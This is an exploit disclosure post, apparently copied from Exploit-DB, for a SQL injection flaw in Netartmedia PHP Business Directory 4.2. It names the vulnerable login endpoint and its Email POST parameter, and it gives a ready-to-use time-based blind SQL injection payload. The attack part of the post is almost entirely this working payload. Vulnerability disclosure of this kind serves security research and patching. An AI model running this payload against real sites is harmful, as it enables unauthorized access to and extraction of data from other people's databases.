---
layout:     post
title:      "Netartmedia PHP Business Directory 4.2 - SQL Injection"
date:       2019-03-20 12:05
author:     "Ahmet Ümit BAYRAM"
category:   exploit
tags:       [sql, sqli, sql injection, exploit-db]
---
# Exploit Title: Netartmedia PHP Business Directory 4.2 - SQL Injection
# Date: 19.03.2019
# Exploit Author: Ahmet Ümit BAYRAM
# Vendor Homepage: https://www.phpbusinessdirectory.com/
# Demo Site: https://www.bizwebdirectory.com/
# Version: 4.2
# Tested on: Kali Linux
# CVE: N/A
 ----- PoC SQLi -----

Request: http://localhost/[PATH]/USERS/loginaction.php
Parameter: Email (POST)
Payload: Email=0'XOR(if(now()=sysdate()%2Csleep(0)%2C0))XOR'Z&Password=g00dPa%24%24w0rD&lang=en&mod=login
            
